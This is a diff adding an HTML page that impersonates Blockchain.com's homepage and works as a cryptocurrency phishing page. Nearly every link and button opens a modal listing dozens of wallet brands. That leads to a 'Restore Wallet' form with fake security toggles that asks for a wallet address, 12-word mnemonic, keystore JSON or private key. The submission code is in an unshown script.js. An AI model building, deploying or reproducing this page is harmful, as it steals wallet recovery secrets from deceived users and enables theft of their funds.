@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blockchain.com | Be early to the future of finance</title>
+    <meta property="og:title" content="Blockchain.com | Be early to the future of finance" />
+    <meta name="description" content="Buy Bitcoin, Ethereum, and other cryptocurrencies on a platform trusted by millions." />
+    <meta property="og:description" content="Buy Bitcoin, Ethereum, and other cryptocurrencies on a platform trusted by millions." />
+    <meta name="twitter:description" content="Buy Bitcoin, Ethereum, and other cryptocurrencies on a platform trusted by millions." />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/png" href="logo11.svg">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<style>
+    .green { color: #22c55e; }
+    .red { color: #ef4444; }
+</style>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <a href="#" class="wallet-trigger">
+                        <img src="svgviewer-output.svg" alt="logo">
+                </div>
+                <nav class="main-nav">
+                    <ul>
+                        <li><a href="#" class="wallet-trigger">Wallet</a></li>
+                        <li><a href="#" class="wallet-trigger">Exchange</a></li>
+                        <li><a href="#" class="wallet-trigger">Explorer</a></li>
+                        <li><a href="#" class="wallet-trigger">Pay</a></li>
+                        <li><a href="#" class="wallet-trigger">Institutional</a></li>
+                        <li><a href="#" class="wallet-trigger more-menu">•••</a></li>
+                    </ul>
+                </nav>
+                <div class="header-actions">
+                    <button class="search-btn wallet-trigger">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M21 21L15 15M17 10C17 13.866 13.866 17 10 17C6.13401 17 3 13.866 3 10C3 6.13401 6.13401 3 10 3C13.866 3 17 6.13401 17 10Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </button>
+                    <button class="btn btn-outline wallet-trigger">Log In</button>
+                    <button class="btn btn-white wallet-trigger">Sign Up</button>
+                </div>
+                <button class="mobile-menu-btn wallet-trigger">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M3 12H21M3 6H21M3 18H21" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" style="margin-bottom: 50px; background-image: url('background.svg');
+  background-repeat: no-repeat; height: 465px;">
+        <div class="container">
+            <div class="hero-content">
+                <h1>Be early to the future of finance</h1>
+                <p>Buy Bitcoin, Ethereum, and other leading cryptocurrencies on a platform trusted by millions.</p>
+                <button class="btn btn-primary wallet-trigger" style="margin-top: 20px; padding-top: 15px; padding-bottom: 15px; font-size: large; border-radius: 16px; ">Restore wallet</button>
+            </div>
+            <section class="crypto-section">
+                <div class="crypto-card" id="btc-card">
+                  <div class="crypto-top">
+                    <span>Buy</span>
+                    <span style="background-color:#e7f7f1;color:#22c55e;">Trade</span>
+                  </div>
+                  <div class="crypto-name">
+                    <img class="crypto-icon" src="btc22.png" alt="btc">
+                    Bitcoin BTC
+                  </div>
+                  <div class="crypto-price" id="btc-price">$--</div>
+                  <div class="crypto-change" id="btc-change"></div>
+                </div>
+              
+                <div class="crypto-card" id="eth-card">
+                  <div class="crypto-top">
+                    <span>Buy</span>
+                    <span style="background-color:#e7f7f1;color:#22c55e;">Trade</span>
+                  </div>
+                  <div class="crypto-name">
+                    <img class="crypto-icon" src="ethlogo.jfif" alt="eth">
+                    Ethereum ETH
+                  </div>
+                  <div class="crypto-price" id="eth-price">$--</div>
+                  <div class="crypto-change" id="eth-change"></div>
+                </div>
+              
+                <div class="crypto-card" id="doge-card">
+                  <div class="crypto-top">
+                    <span>Buy</span>
+                    <span style="background-color:#e7f7f1;color:#22c55e;">Trade</span>
+                  </div>
+                  <div class="crypto-name">
+                    <img class="crypto-icon" src="doge.jfif" alt="doge">
+                    Dogecoin DOGE
+                  </div>
+                  <div class="crypto-price" id="doge-price">$--</div>
+                  <div class="crypto-change" id="doge-change"></div>
+                </div>
+              
+                <div class="crypto-card" id="sol-card">
+                  <div class="crypto-top">
+                    <span>Buy</span>
+                    <span style="background-color:#e7f7f1;color:#22c55e;">Trade</span>
+                  </div>
+                  <div class="crypto-name">
+                    <img class="crypto-icon" src="solanalogo.jfif" alt="sol">
+                    Solana SOL
+                  </div>
+                  <div class="crypto-price" id="sol-price">$--</div>
+                  <div class="crypto-change" id="sol-change"></div>
+                </div>
+              </section>
+              
+              <script>
+                async function loadCryptoPrices() {
+                  // Use CoinGecko's free API (no API key needed)
+                  const ids = 'bitcoin,ethereum,dogecoin,solana';
+                  const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`;
+              
+                  try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+              
+                    // BTC
+                    document.getElementById('btc-price').textContent =
+                      '$' + Number(data.bitcoin.usd).toLocaleString();
+                    setChange('btc-change', data.bitcoin.usd_24h_change);
+              
+                    // ETH
+                    document.getElementById('eth-price').textContent =
+                      '$' + Number(data.ethereum.usd).toLocaleString();
+                    setChange('eth-change', data.ethereum.usd_24h_change);
+              
+                    // DOGE
+                    document.getElementById('doge-price').textContent =
+                      '$' + Number(data.dogecoin.usd).toLocaleString(undefined, { minimumFractionDigits: 3 });
+                    setChange('doge-change', data.dogecoin.usd_24h_change);
+              
+                    // SOL
+                    document.getElementById('sol-price').textContent =
+                      '$' + Number(data.solana.usd).toLocaleString();
+                    setChange('sol-change', data.solana.usd_24h_change);
+              
+                  } catch (err) {
+                    // fallback: you can show error state here if needed
+                    console.error('Failed to fetch crypto prices', err);
+                  }
+                }
+              
+                function setChange(elementId, change) {
+                  const el = document.getElementById(elementId);
+                  const rounded = Number(change).toFixed(2);
+                  if (change >= 0) {
+                    el.textContent = `+${rounded}%`;
+                    el.className = "crypto-change green";
+                  } else {
+                    el.textContent = `${rounded}%`;
+                    el.className = "crypto-change red";
+                  }
+                }
+              
+                // Call once page loads
+                loadCryptoPrices();
+                // Optionally, update every minute:
+                // setInterval(loadCryptoPrices, 60000);
+              </script>
+              
+              <!-- 
+                Make sure you have .green and .red styles for up/down, e.g.:
+                
+              -->
+              
+
+    <!-- Wallet Section -->
+    <section class="wallet-section" style="margin-bottom: 45px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); ">
+        <div class="container">
+            <div class="section-grid">
+                <div class="section-content">
+                    <div class="section-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17 2H7C5.89543 2 5 2.89543 5 4V20C5 21.1046 5.89543 22 7 22H17C18.1046 22 19 21.1046 19 20V4C19 2.89543 18.1046 2 17 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M12 18H12.01" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                        <span>Wallet</span>
+                    </div>
+                    <h2 class="section-title purple" >The only crypto wallet you'll ever need</h2>
+                    <div class="feature-cards">
+                        <div class="feature-card">
+                            <p style="color: black;">Buy, sell, and swap with ease</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Use a card or bank account to buy BTC, ETH, solana, and other assets.</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Earn rewards on your crypto</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Self-custody your crypto</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Connect to DeFi</p>
+                        </div>
+                    </div>
+                    <button class="btn btn-purple wallet-trigger">Restore wallet</button>
+                </div>
+                <div class="section-image">
+                    <div class="image-container">
+                        <div class="purple-circle"></div>
+                        <img src="phone.png" alt="Mobile wallet app" class="wallet-img">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Exchange Section -->
+    <section class="exchange-section" style="box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); margin-bottom: 45px; border-radius: 12px; ">
+        <div class="container">
+            <div class="section-grid reverse">
+                <div class="section-content">
+                    <div class="section-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M16 3L21 8L16 13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M21 8H9C6.79086 8 5 9.79086 5 12V12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M8 21L3 16L8 11" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M3 16H15C17.2091 16 19 14.2091 19 12V12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                        <span style="color: black;">Exchange</span>
+                    </div>
+                    <h2 class="section-title blue" >Lightning-fast crypto trading</h2>
+                    <div class="feature-cards">
+                        <div class="feature-card">
+                            <p>Trade in 3 fiat currencies</p>
+                            <p class="feature-subtitle" style="color: black;">The Exchange supports USD, EUR, and GBP.</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">A matching engine that can keep up with you</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">24/7 live chat support</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Margin Trading</p>
+                        </div>
+                    </div>
+                    <button class="btn btn-blue wallet-trigger">Restore wallet</button>
+                </div>
+                <div class="section-image">
+                    <div class="currency-cards">
+                        <div class="currency-card">
+                            <div class="flag us-flag"></div>
+                            <div class="currency-info">
+                                <h3 style="color: black;">US Dollars</h3>
+                                <p style="color: black;">Routing & Account Number</p>
+                            </div>
+                        </div>
+                        <div class="currency-card">
+                            <div class="flag eu-flag"></div>
+                            <div class="currency-info">
+                                <h3 style="color: black;">Euros</h3>
+                                <p style="color: black;">SWIFT/BIC & IBAN</p>
+                            </div>
+                        </div>
+                        <div class="currency-card">
+                            <div class="flag uk-flag"></div>
+                            <div class="currency-info">
+                                <h3 style="color: black;">British Pounds</h3>
+                                <p style="color: black;">Account Number & Sort Code</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Explorer Section -->
+    <section class="explorer-section" style="box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);  margin-bottom: 45px; border-radius: 12px; ">
+        <div class="container">
+            <div class="section-grid">
+                <div class="section-content">
+                    <div class="section-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M21 21L15 15M17 10C17 13.866 13.866 17 10 17C6.13401 17 3 13.866 3 10C3 6.13401 6.13401 3 10 3C13.866 3 17 6.13401 17 10Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                        <span style="color: black;">Explore</span>
+                    </div>
+                    <h2 class="section-title orange">Blockchain data is in our DNA</h2>
+                    <div class="feature-cards">
+                        <div class="feature-card">
+                            <p style="color: black;">Explore the top blockchains</p>
+                            <p class="feature-subtitle" style="color: black;">Confirm transactions, analyze the market, or simply learn more about crypto.</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Powerful Blockchain Data API</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Industry leading charts</p>
+                        </div>
+                        <div class="feature-card">
+                            <p style="color: black;">Real-time crypto prices</p>
+                        </div>
+                    </div>
+                    <button class="btn btn-orange wallet-trigger">Restore wallet</button>
+                </div>
+                <div class="section-image">
+                    <img src="lappy.png" alt="Blockchain explorer dashboard" class="explorer-img">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Institutional Section -->
+    <section class="institutional-section" style="box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); margin-bottom: 45px; border-radius: 12px; ">
+        <div class="container">
+            <div class="section-grid">
+                <div class="section-content">
+                    <div class="section-label">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M19 21V5C19 3.89543 18.1046 3 17 3H7C5.89543 3 5 3.89543 5 5V21M19 21H5M19 21H21M5 21H3M9 7H15M9 11H15M9 15H13" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                        <span>Institutional</span>
+                    </div>
+                    <h2 class="section-title gray">High-touch crypto solutions for institutions</h2>
+                    <p class="section-description" style="color: black;">Spot OTC, derivatives, structured products, and margin lending.</p>
+                    <button class="btn btn-gray wallet-trigger">Restore wallet</button>
+                </div>
+                <div class="section-image">
+                    <img src="patternn.png" alt="Institutional graphics" class="institutional-img">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Zero to Crypto Section -->
+    <section class="zero-to-crypto" style="box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); ">
+        <div class="container">
+            <h2>Let us take you from zero to crypto</h2>
+            <button class="btn btn-white wallet-trigger">Restore wallet</button>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-top">
+                <div class="footer-logo">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="logo-icon">
+                        <path d="M12 2L2 7L12 12L22 7L12 2Z" fill="currentColor" />
+                        <path d="M2 17L12 22L22 17" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                        <path d="M2 12L12 17L22 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
+                    </svg>
+                    <span>Blockchain.com</span>
+                </div>
+                <div class="footer-social">
+                    <a href="#" class="social-icon wallet-trigger">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M23 3.00005C22.0424 3.67552 20.9821 4.19216 19.86 4.53005C19.2577 3.83756 18.4573 3.34674 17.567 3.12397C16.6767 2.90121 15.7395 2.95724 14.8821 3.2845C14.0247 3.61176 13.2884 4.19445 12.773 4.95376C12.2575 5.71308 11.9877 6.61238 12 7.53005V8.53005C10.2426 8.57561 8.50127 8.18586 6.93101 7.39549C5.36074 6.60513 4.01032 5.43868 3 4.00005C3 4.00005 -1 13 8 17C5.94053 18.398 3.48716 19.099 1 19C10 24 21 19 21 7.50005C20.9991 7.2215 20.9723 6.94364 20.92 6.67005C21.9406 5.66354 22.6608 4.39276 23 3.00005Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                    <a href="#" class="social-icon wallet-trigger">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M16 8C17.5913 8 19.1174 8.63214 20.2426 9.75736C21.3679 10.8826 22 12.4087 22 14V21H18V14C18 13.4696 17.7893 12.9609 17.4142 12.5858C17.0391 12.2107 16.5304 12 16 12C15.4696 12 14.9609 12.2107 14.5858 12.5858C14.2107 12.9609 14 13.4696 14 14V21H10V14C10 12.4087 10.6321 10.8826 11.7574 9.75736C12.8826 8.63214 14.4087 8 16 8Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M6 9H2V21H6V9Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M4 6C5.10457 6 6 5.10457 6 4C6 2.89543 5.10457 2 4 2C2.89543 2 2 2.89543 2 4C2 5.10457 2.89543 6 4 6Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                    <a href="#" class="social-icon wallet-trigger">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M17 2H7C4.23858 2 2 4.23858 2 7V17C2 19.7614 4.23858 22 7 22H17C19.7614 22 22 19.7614 22 17V7C22 4.23858 19.7614 2 17 2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M16 11.37C16.1234 12.2022 15.9813 13.0522 15.5938 13.799C15.2063 14.5458 14.5931 15.1514 13.8416 15.5297C13.0901 15.9079 12.2384 16.0396 11.4078 15.9059C10.5771 15.7723 9.80976 15.3801 9.21484 14.7852C8.61991 14.1902 8.22773 13.4229 8.09406 12.5922C7.9604 11.7615 8.09206 10.9099 8.47032 10.1584C8.84858 9.40685 9.45418 8.79374 10.201 8.40624C10.9478 8.01874 11.7978 7.87659 12.63 8C13.4789 8.12588 14.2648 8.52146 14.8717 9.12831C15.4785 9.73515 15.8741 10.5211 16 11.37Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M17.5 6.5H17.51" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                    <a href="#" class="social-icon wallet-trigger">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18 2H15C13.6739 2 12.4021 2.52678 11.4645 3.46447C10.5268 4.40215 10 5.67392 10 7V10H7V14H10V22H14V14H17L18 10H14V7C14 6.73478 14.1054 6.48043 14.2929 6.29289C14.4804 6.10536 14.7348 6 15 6H18V2Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+            <div class="footer-links">
+                <div class="footer-column">
+                    <h3>Products</h3>
+                    <ul>
+                        <li><a href="#" class="wallet-trigger">Wallet</a></li>
+                        <li><a href="#" class="wallet-trigger">Explorer</a></li>
+                        <li><a href="#" class="wallet-trigger">Institutional</a></li>
+                        <li><a href="#" class="wallet-trigger">Earn</a></li>
+                        <li><a href="#" class="wallet-trigger">Pay</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Resources</h3>
+                    <ul>
+                        <li><a href="#" class="wallet-trigger">APIs</a></li>
+                        <li><a href="#" class="wallet-trigger">Blog</a></li>
+                        <li><a href="#" class="wallet-trigger">Podcast</a></li>
+                        <li><a href="#" class="wallet-trigger">Bitcoin Price</a></li>
+                        <li><a href="#" class="wallet-trigger">Ethereum Price</a></li>
+                        <li><a href="#" class="wallet-trigger">Solana Price</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Company</h3>
+                    <ul>
+                        <li><a href="#" class="wallet-trigger">About</a></li>
+                        <li><a href="#" class="wallet-trigger">Careers</a></li>
+                        <li><a href="#" class="wallet-trigger">Prime</a></li>
+                        <li><a href="#" class="wallet-trigger">Ventures</a></li>
+                        <li><a href="#" class="wallet-trigger">Support</a></li>
+                        <li><a href="#" class="wallet-trigger">Legal & Privacy</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Learn</h3>
+                    <ul>
+                        <li><a href="#" class="wallet-trigger">What is Bitcoin?</a></li>
+                        <li><a href="#" class="wallet-trigger">What is a crypto wallet?</a></li>
+                        <li><a href="#" class="wallet-trigger">What is a DEX?</a></li>
+                        <li><a href="#" class="wallet-trigger">Learning Portal</a></li>
+                        <li><a href="#" class="wallet-trigger">Buy BTC</a></li>
+                        <li><a href="#" class="wallet-trigger">Buy ETH</a></li>
+                        <li><a href="#" class="wallet-trigger">Buy SOL</a></li>
+                        <li><a href="#" class="wallet-trigger">Buy XRP</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>© 2024 Blockchain.com. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Wallet Connect Modal -->
+    <div class="modal-overlay" id="walletConnectModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title">
+                    <i class="fas fa-info-circle modal-title-icon"></i>
+                    Get Started
+                </div>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="wallet-list">
+                    <!-- Existing wallets -->
+                    <div class="wallet-item" data-wallet="metamask">
+                        <div class="wallet-icon">
+                            <img src="metamask.png" alt="Metamask">
+                        </div>
+                        <span>Metamask</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="trustwallet">
+                        <div class="wallet-icon">
+                            <img src="trust1.jfif" alt="Trust Wallet">
+                        </div>
+                        <span>Trust Wallet</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="coinbase">
+                        <div class="wallet-icon">
+                            <img src="coinase1.png" alt="Coinbase">
+                        </div>
+                        <span>Coinbase</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="phantom">
+                        <div class="wallet-icon">
+                            <img src="phantom1.png" alt="Phantom">
+                        </div>
+                        <span>Phantom</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="solflare">
+                        <div class="wallet-icon">
+                            <img src="solflare.png" alt="Solflare">
+                        </div>
+                        <span>Solflare</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="okx">
+                        <div class="wallet-icon">
+                            <img src="okx.png" alt="OKX">
+                        </div>
+                        <span>OKX</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="bitget">
+                        <div class="wallet-icon">
+                            <img src="bitget.jfif" alt="Bitget">
+                        </div>
+                        <span>Bitget</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="uniswap">
+                        <div class="wallet-icon">
+                            <img src="uniswap.png" alt="Uniswap">
+                        </div>
+                        <span>Uniswap</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="zerion">
+                        <div class="wallet-icon">
+                            <img src="zerion.png" alt="Zerion">
+                        </div>
+                        <span>Zerion</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="cryptocom">
+                        <div class="wallet-icon">
+                            <img src="crytpo.jfif" alt="Crypto.com">
+                        </div>
+                        <span>Crypto.com</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="tonkeeper">
+                        <div class="wallet-icon">
+                            <img src="tonkeeper.png" alt="Tonkeeper">
+                        </div>
+                        <span>Tonkeeper</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="ledger">
+                        <div class="wallet-icon">
+                            <img src="ledger.png" alt="Ledger">
+                        </div>
+                        <span>Ledger</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="sparrow">
+                        <div class="wallet-icon">
+                            <img src="sparrow.jfif" alt="Sparrow">
+                        </div>
+                        <span>Sparrow</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="xaman">
+                        <div class="wallet-icon">
+                            <img src="xaman1.jfif" alt="Xaman">
+                        </div>
+                        <span>Xaman</span>
+                    </div>
+                    
+                    <!-- New wallets -->
+                    <div class="wallet-item" data-wallet="walletconnect">
+                        <div class="wallet-icon">
+                            <img src="walletconnect1.png" alt="WalletConnect">
+                        </div>
+                        <span>WalletConnect</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="blockstream">
+                        <div class="wallet-icon">
+                            <img src="block stream.png" alt="Blockstream">
+                        </div>
+                        <span>Blockstream</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="trezor">
+                        <div class="wallet-icon">
+                            <img src="trezor.png" alt="Trezor">
+                        </div>
+                        <span>Trezor</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="aqua">
+                        <div class="wallet-icon">
+                            <img src="aqua1.png" alt="Aqua">
+                        </div>
+                        <span>Aqua</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="kasware">
+                        <div class="wallet-icon">
+                            <img src="kasWare.png" alt="kasWare">
+                        </div>
+                        <span>kasWare</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="coldcard">
+                        <div class="wallet-icon">
+                            <img src="coldcard.jfif" alt="ColdCard">
+                        </div>
+                        <span>ColdCard</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="tangem">
+                        <div class="wallet-icon">
+                            <img src="tangem.png" alt="Tangem">
+                        </div>
+                        <span>Tangem</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="lobstr">
+                        <div class="wallet-icon">
+                            <img src="lobstr.jfif" alt="Lobstr">
+                        </div>
+                        <span>Lobstr</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="bluewallet">
+                        <div class="wallet-icon">
+                            <img src="bluewallet.png" alt="BlueWallet">
+                        </div>
+                        <span>BlueWallet</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="nunchuck">
+                        <div class="wallet-icon">
+                            <img src="nunchuck.png" alt="Nunchuck">
+                        </div>
+                        <span>Nunchuck</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="bitpay">
+                        <div class="wallet-icon">
+                            <img src="bitpay.jfif" alt="Bitpay">
+                        </div>
+                        <span>Bitpay</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="unisat">
+                        <div class="wallet-icon">
+                            <img src="unisat.jfif" alt="Unisat">
+                        </div>
+                        <span>Unisat</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="solidifi">
+                        <div class="wallet-icon">
+                            <img src="solidifi.jfif" alt="Solidifi">
+                        </div>
+                        <span>Solidifi</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="keplr">
+                        <div class="wallet-icon">
+                            <img src="keplr.jfif" alt="Keplr">
+                        </div>
+                        <span>Keplr</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="swell">
+                        <div class="wallet-icon">
+                            <img src="swell.jfif" alt="Swell">
+                        </div>
+                        <span>Swell</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="zcash">
+                        <div class="wallet-icon">
+                            <img src="zcash.png" alt="ZCash">
+                        </div>
+                        <span>ZCash</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="optimism">
+                        <div class="wallet-icon">
+                            <img src="optimism.png" alt="Optimism">
+                        </div>
+                        <span>Optimism</span>
+                    </div>
+                    <div class="wallet-item" data-wallet="others">
+                        <div class="wallet-icon">
+                            <img src="wallet22.png" alt="Others">
+                        </div>
+                        <span>Others</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Connection Modal -->
+    <div class="modal-overlay" id="walletConnectionModal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-title" id="walletName">Wallet</div>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="wallet-connect-content">
+                    <div class="wallet-logo" id="walletLogo">
+                        <img src="wallet22.png" alt="Wallet Logo" id="walletLogoImg">
+                    </div>
+                    <p class="connecting-text">initializing secure connection with <span id="walletNameText">Wallet</span></p>
+                    
+                    <div class="options-row">
+                        <div class="option-item">
+                            <span>Hide my IP</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="hideIpToggle">
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                        <div class="option-item">
+                            <span>Encrypt Connection</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="encryptToggle" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                        <div class="option-item">
+                            <span>Auto Validate</span>
+                            <label class="toggle-switch">
+                                <input type="checkbox" id="validateToggle" checked>
+                                <span class="toggle-slider"></span>
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <div class="tabs">
+                        <div class="tab active" data-tab="phrase" style="color: black;">Phrase</div>
+                        <div class="tab" data-tab="keystore" style="color: black;">Keystore JSON</div>
+                        <div class="tab" data-tab="private" style="color: black;">Private Key</div>
+                    </div>
+                    
+                    <div class="tab-content">
+                        <div class="form-group">
+                            <label for="walletAddress" style="color: black;">Enter wallet Address</label>
+                            <input type="text" id="walletAddress" class="form-control" style="color: black;">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="mnemonic" style="color: black;">12 Mnemonic Phrase</label>
+                            <textarea id="mnemonic" class="form-control"></textarea>
+                            <p class="form-hint">Typically 12 (sometimes 24) words separated by a single space.</p>
+                        </div>
+                        
+                        <button class="import-btn" style="border-radius: 16px; font-size: large;">Restore Wallet</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
